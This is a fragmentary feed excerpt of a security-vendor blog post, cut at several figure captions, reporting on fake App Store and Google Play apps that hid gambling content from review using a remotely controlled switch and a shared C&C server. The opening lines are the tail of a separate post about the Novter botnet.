brief</em></strong></a>, while the indicators of compromise (IoCs) are in this <a href=\"https://documents.trendmicro.com/assets/Appendix-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf\" target=\"_blank\" rel=\"noopener noreferrer\"><strong><em>appendix</em></strong></a>.</p>\n<p><em>With additional analysis from Ecular Xu.</em></p>\n<p><em>Hat tip to ProofPoint’s researcher Kafeine whom we worked with in this research.</em></p>\n<p>The post <a rel=\"nofollow\" href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/\">New Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign</a> appeared first on <a rel=\"nofollow\" href=\"https://blog.trendmicro.com/trendlabs-security-intelligence\"></a>.</p>\n<div class=\"feedflare\">\n<a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:V_sGLiPBpWU\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:gIN9vFwOqvQ\" border=\"0\"></img></a> <a href=\"http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174\" border=\"0\"></img></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/1s3zVxzbXkI\" height=\"1\" width=\"1\" alt=\"\"/>",

We have previously reported on <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/fake-voice-apps-on-google-play-botnet-likely-in-development/\" target=\"_blank\" rel=\"noopener noreferrer\">fake Android voice apps</a> on Google Play, which were observed to be impostor apps for voice messenger platforms. Recently, we also uncovered counterfeit applications hiding among legitimate offerings on app stores. These fake apps masquerade as similar apps to trick unwitting users into downloading gambling apps.</p>\n<p>We found hundreds of the fake apps on iOS App Store and Google Play, with descriptions that are inconsistent with their content. While the apps’ descriptions varied, they share the same suspicious behavior: They could transform into gambling apps that may get banned for violating local government regulations and app store policies.</p>\n<p>Some of the apps ranked in the Top 100 of the App Store and were possibly downloaded numerous times. Some were even rated more than 100,000 times. We’ve notified Apple and Google about our findings. Both have since removed the apps from App Store and Google Play.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-gambling-apps-screenshot-ios-android.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-gambling-apps-screenshot-ios-android.png\" alt=\"Figure 1.

A June <a href=\"https://developer.apple.com/news/?id=06032019j\" target=\"_blank\" rel=\"noopener noreferrer\">update</a>, for instance, states that HTML5 games distributed within apps may not provide access to real money gaming, lotteries, and others. Google Play, in addition, <a href=\"https://play.google.com/about/restricted-content/gambling/\" target=\"_blank\" rel=\"noopener noreferrer\">only permits</a> gambling apps in certain countries and as long as they meet their requirements. The fake apps we found do not meet the guidelines.</p>\n<p>These fake apps start as a seemingly normal app, with varying features and functionalities (e.g., for weather tracking or entertainment purposes), but we found that the fake apps can be controlled to appear innocuous. We describe the whole process in the flowchart below.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-7-gambling-apps-app-stores.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-7-gambling-apps-app-stores.jpg\" alt=\"Figure 7.

How the gambling apps get to the app stores</em></p>\n<p>The fake apps have some interesting behaviors. For one thing, the apps have a “switch” feature, whereby a threat actor can set the app to either show or hide the actual app content. In this case, the API is switched off during the app&#8217;s review process.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-8-gambling-apps-loaded-url-ios-android.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-8-gambling-apps-loaded-url-ios-android.png\" alt=\"Figure 8.

For example, before the app gets reviewed, the developer can simply press the &#8220;off&#8221; switch so a normal-looking app starts (see Figure 1 for the normal and fake app comparisons). The app could pass the app store reviews because the gambling aspect has been hidden.</p>\n<p>After the apps have passed the review, they can be publicly downloaded from the app stores. The threat actors then switch it &#8220;on&#8221; to enable viewing of the app&#8217;s actual content.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-13-gambling-apps-implanted-page.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-13-gambling-apps-implanted-page.png\" alt=\"Figure 13.

Implanted page on these apps</em></p>\n<h3><strong>Fake apps outrank apps they imitate</strong></h3>\n<p>At the time of our research, these apps only seem to use WebView to load a gambling website, and do nothing malicious on the device. However, fake as these apps may be, they still outranked the apps they impersonated.</p>\n<p>According to Google Play, the apps were only published on August 2019, which explains their low download numbers. This is not the case on the iOS App Store.</p>\n<p>A keyword search on the App Store revealed two apps that share the same category. The fake app ranks higher than the app it’s similar to (i.e., the gambling app ranks higher than the wine app).</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-14-gambling-apps-fake-app-legitimate-app-rank.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-14-gambling-apps-fake-app-legitimate-app-rank.png\" alt=\"Figure 14. The fake app ranks higher than the legitimate app\" width=\"300\" /></a></p>\n<p align=\"center\"><em>Figure 14. The fake app ranks higher than the legitimate app</em></p>\n<p>The legitimate apps have been kept updated for two years, while the fake app only had two minor updates for the past six months. We believe that the pop-up WebView was implanted in the second update, on top of using the name and functionality of the legitimate app, to trick users and spread the gambling apps. The actors may also have included SEO techniques to make the app more relevant to search engines.</p>\n<p>On the Chinese iOS App Store, for instance, it appears that many of these fake apps have cropped up and are in the Top 100 list. These apps have been highly downloaded, with one of them even getting 440,000 ratings.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-15-gambling-apps-top-rank-normal-apps.png\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-15-gambling-apps-top-rank-normal-apps.png\" alt=\"Figure 15.

It will respond with another URL to be loaded in WebView, according to the app ID. After we tried accessing it, the server shut down. Interestingly, at the same time, these apps began to behave like normal apps because we &#8220;shut down&#8221; the &#8220;switch&#8221; by accident. This suggests that these fake apps share the same C&amp;C server, which could be a good indicator for identifying fake apps.</p>\n<p align=\"center\"><a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-17-gambling-apps-CC-structure-domains-apps.jpg\"><img src=\"https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-17-gambling-apps-CC-structure-domains-apps.jpg\" alt=\"Figure 17. C&amp;C structure: How different domains and apps were related\" width=\"450\" /></a></p>\n<p align=\"center\"><em>Figure 17. C&amp;C structure: How different domains and apps were related</em></p>\n<p>Since hundreds of fake apps are uploaded to the app stores and they use different developer accounts, their categories vary. Assessing the central C&amp;C server can be a good way to lump the apps together and prevent them from reaching the users.</p>\n<h3><strong>Best practices and Trend Micro solutions</strong></h3>\n<p>The threat actors here passed the app review process by posing as a run-of-the-mill app, hiding its actual nature (in this case, for gambling). The gambling apps may also be deemed illegal in some countries and rejected by the iOS App Store and Google Play. We contacted Apple and Google about this research. The apps have already been pulled offline.</p>\n<p>Furthermore, these methods pose concerns to legitimate app developers and the mobile ecosystem since these highly rated fake apps are occupying the top list.
